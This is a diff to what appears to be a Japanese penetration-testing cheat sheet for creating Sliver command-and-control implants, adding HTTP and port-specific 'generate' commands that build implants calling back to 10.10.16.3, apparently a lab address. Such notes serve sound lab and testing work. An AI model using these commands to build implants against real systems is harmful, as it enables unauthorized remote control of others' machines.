@@ -1,4 +1,3 @@
-# # Sliver
 ## ## Implantの作成
 ```sh
 # mtls
@@ -6,7 +5,9 @@ generate --mtls 10.10.16.3 --skip-symbols
 ## Linux
 generate --mtls 10.10.16.3 --os linux --skip-symbols
 # HTTP/HTTPS
-generate --mtls 10.10.16.3 --os linux --skip-symbols
+generate --http 10.10.16.3 --os linux --skip-symbols
+## Port指定
+generate --http 10.10.16.3:4566 --os linux --skip-symbols
 
 # DNS
 ```
